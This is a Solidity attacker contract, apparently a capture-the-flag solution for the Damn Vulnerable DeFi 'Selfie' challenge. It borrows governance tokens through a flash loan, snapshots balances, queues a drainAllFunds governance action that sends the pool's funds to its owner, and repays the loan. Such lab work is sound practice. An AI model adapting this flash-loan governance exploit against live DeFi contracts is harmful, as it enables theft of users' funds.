// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

contract SelfiePoolAttacker is Ownable {
    using Address for address;

    SimpleGovernance private _governance;    
    address private _selfiePoolAddress;
    uint private _currentStep;
    DamnValuableTokenSnapshot token;

    constructor(address _governanceAddress, address selfiePoolAddress_, address _tokenAddress) {
        _governance = SimpleGovernance(_governanceAddress);
        _selfiePoolAddress = selfiePoolAddress_;
        token = DamnValuableTokenSnapshot(_tokenAddress);
    }

    function getFlashLoan(uint256 amount) external {
        _selfiePoolAddress.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
    }

    function getCurrentStep() external view returns (uint) {
        return _currentStep;
    }

    function toUint256(bytes memory _bytes)   
    internal
    pure
    returns (uint256 value) {
        assembly {
            value := mload(add(_bytes, 0x20))
        }
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        tokenAddress.functionCall(
            abi.encodeWithSignature("snapshot()")
        );

        uint256 actionId = _governance.queueAction(
            _selfiePoolAddress, 
            abi.encodeWithSignature("drainAllFunds(address)", owner()), 
            0
        ); 

        require(actionId == 1, "action id must be 1");

        // pay back
        token.transfer(_selfiePoolAddress, borrowAmount);
        require(address(token) == tokenAddress, "address of token is WA");
        // tokenAddress.functionCall(
        //     abi.encodeWithSignature("transfer(address, uint256)", _selfiePoolAddress, borrowAmount)
        // );   
    }
}